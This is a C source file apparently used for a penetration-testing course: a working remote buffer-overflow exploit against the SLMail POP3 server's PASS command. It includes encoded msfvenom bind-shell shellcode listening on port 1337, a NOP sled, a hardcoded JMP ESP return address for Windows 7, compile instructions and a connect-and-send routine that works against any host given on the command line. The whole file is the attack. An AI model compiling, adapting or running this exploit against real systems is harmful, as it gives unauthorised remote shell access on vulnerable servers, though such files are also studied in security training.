/*
SLMAIL REMOTE PASSWD BOF - TJnull 
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

/* To compile the exploit for windows in kali run this: i686-w64-mingw32-gcc 646-fixed.c -lws2_32 -o slmail.exe */
/** 
* [*] bind 4444
*
* msfvenom --arch x86 -p windows/shell_bind_tcp LPORT=1337 -b '\x00\x0a\x0d' -f c -e x86/shikata_ga_nai 
*
*/
unsigned char shellcode[] = 
"\xd9\xee\xd9\x74\x24\xf4\xbd\x07\xf4\xcc\xe0\x5a\x2b\xc9\xb1"
"\x53\x83\xc2\x04\x31\x6a\x13\x03\x6d\xe7\x2e\x15\x8d\xef\x2d"
"\xd6\x6d\xf0\x51\x5e\x88\xc1\x51\x04\xd9\x72\x62\x4e\x8f\x7e"
"\x09\x02\x3b\xf4\x7f\x8b\x4c\xbd\xca\xed\x63\x3e\x66\xcd\xe2"
"\xbc\x75\x02\xc4\xfd\xb5\x57\x05\x39\xab\x9a\x57\x92\xa7\x09"
"\x47\x97\xf2\x91\xec\xeb\x13\x92\x11\xbb\x12\xb3\x84\xb7\x4c"
"\x13\x27\x1b\xe5\x1a\x3f\x78\xc0\xd5\xb4\x4a\xbe\xe7\x1c\x83"
"\x3f\x4b\x61\x2b\xb2\x95\xa6\x8c\x2d\xe0\xde\xee\xd0\xf3\x25"
"\x8c\x0e\x71\xbd\x36\xc4\x21\x19\xc6\x09\xb7\xea\xc4\xe6\xb3"
"\xb4\xc8\xf9\x10\xcf\xf5\x72\x97\x1f\x7c\xc0\xbc\xbb\x24\x92"
"\xdd\x9a\x80\x75\xe1\xfc\x6a\x29\x47\x77\x86\x3e\xfa\xda\xcf"
"\xf3\x37\xe4\x0f\x9c\x40\x97\x3d\x03\xfb\x3f\x0e\xcc\x25\xb8"
"\x71\xe7\x92\x56\x8c\x08\xe3\x7f\x4b\x5c\xb3\x17\x7a\xdd\x58"
"\xe7\x83\x08\xf4\xef\x22\xe3\xeb\x12\x94\x53\xac\xbc\x7d\xbe"
"\x23\xe3\x9e\xc1\xe9\x8c\x37\x3c\x12\xb7\xfe\xc9\xf4\xdd\x10"
"\x9c\xaf\x49\xd3\xfb\x67\xee\x2c\x2e\xd0\x98\x65\x38\xe7\xa7"
"\x75\x6e\x4f\x3f\xfe\x7d\x4b\x5e\x01\xa8\xfb\x37\x96\x26\x6a"
"\x7a\x06\x36\xa7\xec\xab\xa5\x2c\xec\xa2\xd5\xfa\xbb\xe3\x28"
"\xf3\x29\x1e\x12\xad\x4f\xe3\xc2\x96\xcb\x38\x37\x18\xd2\xcd"
"\x03\x3e\xc4\x0b\x8b\x7a\xb0\xc3\xda\xd4\x6e\xa2\xb4\x96\xd8"
"\x7c\x6a\x71\x8c\xf9\x40\x42\xca\x05\x8d\x34\x32\xb7\x78\x01"
"\x4d\x78\xed\x85\x36\x64\x8d\x6a\xed\x2c\xbd\x20\xaf\x05\x56"
"\xed\x3a\x14\x3b\x0e\x91\x5b\x42\x8d\x13\x24\xb1\x8d\x56\x21"
"\xfd\x09\x8b\x5b\x6e\xfc\xab\xc8\x8f\xd5";


void exploit(int sock) {
      FILE *test;
      char *ptr; //change from 'int *ptr;' to ' char *ptr'
      char userbuf[] = "USER Tjnull\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = evil; //change from 'ptr =&evil ' to 'ptr = evil'
      ptr = ptr + 2606; // 2606 for pwk
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2600] = 0x5F4A358F; // JMP ESP PWK Win 7 5F4A358F FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 1337...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by TJnull");
    if ( argc < 2 ) { printf("usage: slmail.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}